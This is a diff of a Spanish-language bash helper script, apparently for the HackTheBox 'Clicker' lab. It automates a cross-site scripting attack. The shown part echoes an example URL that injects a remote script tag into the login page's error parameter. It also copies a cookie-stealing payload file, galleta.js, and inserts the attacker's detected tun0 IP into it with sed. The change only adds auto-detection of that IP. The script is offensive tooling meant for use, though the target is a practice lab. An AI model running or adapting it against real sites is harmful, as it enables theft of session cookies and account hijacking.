@@ -10,13 +10,26 @@ echo "por ejemplo http://clicker.htb/login.php?err=%3Cscript%20src=%22http://10.
 echo ""
 
 
+
+
+
 # Copiar galleta.js desde /usr/bin al directorio actual
 cp /usr/bin/galleta.js .
 
-# Solicitar la IP al usuario
-read -p "Por favor, ingresa tu dirección IP: " nueva_ip
+# Obtener la dirección IP de la interfaz tun0 y eliminar el /23
+ip_tun0=$(ip addr show tun0 | grep -oP 'inet \K\S+' | cut -d'/' -f1)
 
-# Reemplazar la IP local en galleta.js con la nueva IP
+# Mostrar la dirección IP de la interfaz tun0 y preguntar al usuario si desea utilizarla
+read -p "Tu dirección IP actual es: $ip_tun0. ¿Deseas utilizar esta IP? (Presiona Enter para sí, 'n' para no): " respuesta
+
+# Si el usuario elige no, pedir una nueva dirección IP
+if [[ $respuesta == "n" ]]; then
+    read -p "Por favor, ingresa la dirección IP que deseas utilizar: " nueva_ip
+else
+    nueva_ip=$ip_tun0
+fi
+
+# Reemplazar la dirección IP en galleta.js con la nueva IP
 sed -i "s/IPLOCAL/$nueva_ip/g" galleta.js
 
 # Ejecutar el comando galleta
